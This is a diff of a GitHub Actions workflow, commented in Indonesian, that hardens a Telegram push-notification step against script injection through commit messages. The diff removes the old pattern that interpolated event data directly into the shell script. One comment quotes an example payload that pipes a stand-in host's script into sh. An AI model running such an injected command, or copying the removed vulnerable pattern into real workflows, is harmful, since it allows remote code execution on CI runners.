@@ -5,6 +5,9 @@ on:
     branches:
       - '**' # Menangkap push ke SEMUA branch (main, master, patch-1, dev, dll)
 
+permissions:
+  contents: read
+
 jobs:
   notify:
     runs-on: ubuntu-latest
@@ -13,15 +16,35 @@ jobs:
         env:
           TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           CHAT_ID: ${{ secrets.TELEGRAM_TO }}
+          # Semua nilai dari event lewat env, TIDAK disisipkan ke body skrip.
+          # Kalau commit message berisi `"; curl evil.sh | sh; "`, isinya cuma
+          # data untuk jq, tidak pernah jadi kode yang dieksekusi runner.
+          REPO: ${{ github.repository }}
+          BRANCH: ${{ github.ref_name }}
+          ACTOR: ${{ github.actor }}
+          COMMIT_MSG: ${{ github.event.head_commit.message }}
         run: |
-          # Ambil baris pertama dari pesan commit untuk menghindari format JSON rusak
-          COMMIT_MSG=$(echo "${{ github.event.head_commit.message }}" | head -n 1)
-          
-          # Kirim request ke API Webhook Telegram
-          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
+          set -euo pipefail
+          # Ambil hanya baris pertama, tanpa membuka diri ke quote/subshell.
+          FIRST_LINE=$(printf '%s' "$COMMIT_MSG" | head -n 1)
+
+          TEXT=$(printf '🚀 *Pembaruan Proyek Vercel*\n\n📦 *Repo:* `%s`\n🌿 *Branch:* `%s`\n👤 *Pushed by:* `%s`\n📝 *Commit:* %s\n\n⏳ _Vercel sedang memproses deployment..._' \
+            "$REPO" "$BRANCH" "$ACTOR" "$FIRST_LINE")
+
+          # JSON dibangun jq: kutip, backslash, dan newline di commit message
+          # otomatis di-escape, jadi payload tidak pernah rusak.
+          PAYLOAD=$(jq -n \
+            --arg chat_id "$CHAT_ID" \
+            --arg text "$TEXT" \
+            '{chat_id: $chat_id, text: $text, parse_mode: "Markdown"}')
+
+          STATUS=$(curl -sS -o /tmp/tg-response.json -w '%{http_code}' \
+            -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
             -H "Content-Type: application/json" \
-            -d '{
-              "chat_id": "'"${CHAT_ID}"'",
-              "text": "🚀 *Pembaruan Proyek Vercel*\n\n📦 *Repo:* `${{ github.repository }}`\n🌿 *Branch:* `${{ github.ref_name }}`\n👤 *Pushed by:* `${{ github.actor }}`\n📝 *Commit:* '"${COMMIT_MSG}"'\n\n⏳ _Vercel sedang memproses deployment..._",
-              "parse_mode": "Markdown"
-            }'
+            --data-binary "$PAYLOAD")
+
+          if [ "$STATUS" != "200" ]; then
+            echo "::error::Telegram API menolak dengan HTTP $STATUS"
+            jq -r '.description // "tanpa deskripsi"' /tmp/tg-response.json || true
+            exit 1
+          fi
